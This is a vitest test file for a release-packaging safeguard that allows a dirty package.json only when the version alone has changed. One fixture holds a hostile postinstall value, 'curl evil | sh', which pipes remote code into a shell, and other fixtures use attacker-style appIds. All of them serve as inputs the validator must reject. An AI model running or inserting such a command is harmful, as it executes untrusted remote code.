/**
 * The one dirty-tree exemption the packaging wrapper allows.
 *
 * The release workflow computes the version itself and writes it to the working tree WITHOUT
 * committing (a commit would be a push to main, which would retrigger the release). That leaves
 * package.json and package-lock.json dirty, and the wrapper refused outright — which is exactly how
 * the first automatic release died, after the version pipeline had already done its job correctly.
 *
 * The exemption has to stay narrow, because package.json is not only the version: it also carries
 * the entire electron-builder `build` block. "package.json is dirty, never mind" would wave through
 * a changed appId, target list or signing flag on a build claiming a public commit's provenance.
 */
import { describe, expect, it } from 'vitest'
// @ts-expect-error -- plain .mjs build script, no type declarations by design
import {
  changedSourcePaths,
  isVersionOnlyManifestChange,
  requireCleanSourceStatus,
} from '../../scripts/windows-installer.mjs'

const pkg = (extra: Record<string, unknown>) =>
  JSON.stringify({ name: 'node-terminal', version: '0.4.3', build: { appId: 'com.nodeterm.app' }, ...extra })

describe('changedSourcePaths', () => {
  it('is null for a clean tree', () => {
    expect(changedSourcePaths('')).toBeNull()
    expect(changedSourcePaths('\n  \n')).toBeNull()
  })

  it('reads the path out of porcelain v1 entries, including untracked', () => {
    expect(changedSourcePaths(' M package.json\n?? scratch.txt')).toEqual(['package.json', 'scratch.txt'])
  })

  it('takes the NEW path of a rename', () => {
    // `R  old -> new`. Reporting the old path would let a rename INTO a build file slip past the
    // allowlist under the old name.
    expect(changedSourcePaths('R  build/icon.ico -> package.json')).toEqual(['package.json'])
  })
})

describe('isVersionOnlyManifestChange', () => {
  it('accepts a pure version bump', () => {
    expect(isVersionOnlyManifestChange(pkg({}), pkg({ version: '0.4.4' }).replace('"0.4.3"', '"0.4.4"'))).toBe(true)
  })

  it('rejects a changed build block riding along with the bump', () => {
    const committed = pkg({})
    const working = JSON.stringify({
      name: 'node-terminal',
      version: '0.4.4',
      build: { appId: 'com.attacker.app' },
    })
    expect(isVersionOnlyManifestChange(committed, working)).toBe(false)
  })

  it('rejects an added field', () => {
    expect(isVersionOnlyManifestChange(pkg({}), pkg({ scripts: { postinstall: 'curl evil | sh' } }))).toBe(false)
  })

  it('refuses rather than assumes when either side is unparsable', () => {
    // "Could not read it" is not "only the version changed".
    expect(isVersionOnlyManifestChange('{not json', pkg({}))).toBe(false)
    expect(isVersionOnlyManifestChange(pkg({}), 'null')).toBe(false)
  })
})

describe('requireCleanSourceStatus', () => {
  const bumped = (relative: string) => ({
    committed: pkg({}),
    working: relative === 'package.json' ? pkg({}).replace('"0.4.3"', '"0.4.4"') : pkg({}),
  })

  it('passes a clean tree with no reader at all', () => {
    expect(() => requireCleanSourceStatus('')).not.toThrow()
  })

  it('allows the two manifests when they differ only by version', () => {
    expect(() => requireCleanSourceStatus(' M package.json\n M package-lock.json', bumped)).not.toThrow()
  })

  it('still refuses any OTHER dirty path, even alongside a legitimate bump', () => {
    expect(() => requireCleanSourceStatus(' M package.json\n M src/main/index.ts', bumped)).toThrow(/dirty source tree/)
  })

  it('refuses a dirty manifest when no reader is supplied to prove it is only a bump', () => {
    expect(() => requireCleanSourceStatus(' M package.json')).toThrow(/dirty source tree/)
  })

  it('refuses when package.json changed by more than its version', () => {
    const tampered = () => ({ committed: pkg({}), working: pkg({ build: { appId: 'com.attacker.app' } }) })
    expect(() => requireCleanSourceStatus(' M package.json', tampered)).toThrow(/more than its version/)
  })
})
